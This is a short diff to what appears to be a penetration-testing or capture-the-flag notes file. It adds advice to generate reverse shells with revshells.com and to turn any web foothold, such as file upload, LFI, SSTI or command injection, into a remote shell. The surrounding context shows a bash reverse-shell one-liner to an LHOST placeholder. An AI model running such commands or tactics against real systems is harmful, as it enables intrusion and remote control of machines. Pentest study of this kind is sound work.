@@ -34,6 +34,14 @@ window closes, the whole tmux server). Stop target-side processes with
 
 ## Reverse shells
 
+When a payload family fails or you need one for an unusual shell/OS/encoding,
+**[revshells.com](https://www.revshells.com/)** generates every variant (bash,
+nc, mkfifo, python, perl, PowerShell, PHP, Ruby, Go, msfvenom, …) with LHOST/
+LPORT filled in and per-shell encodings — faster and less error-prone than
+hand-editing. Any web foothold (file upload, LFI, SSTI, command injection)
+should aim straight at one of these; treat "I can write/exec anything" as
+"I get a reverse shell" and pick the family that matches the target's shell.
+
 ```bash
 # bash
 bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'
